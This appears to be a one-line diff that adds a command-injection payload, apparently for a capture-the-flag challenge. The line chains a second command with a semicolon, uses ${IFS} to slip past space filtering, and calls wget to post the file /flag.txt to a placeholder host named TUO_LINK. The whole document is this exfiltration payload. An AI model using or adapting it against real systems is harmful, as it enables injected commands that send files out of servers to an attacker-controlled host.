@@ -1,0 +1,1 @@
+;wget${IFS}--post-file=/flag.txt${IFS}TUO_LINK
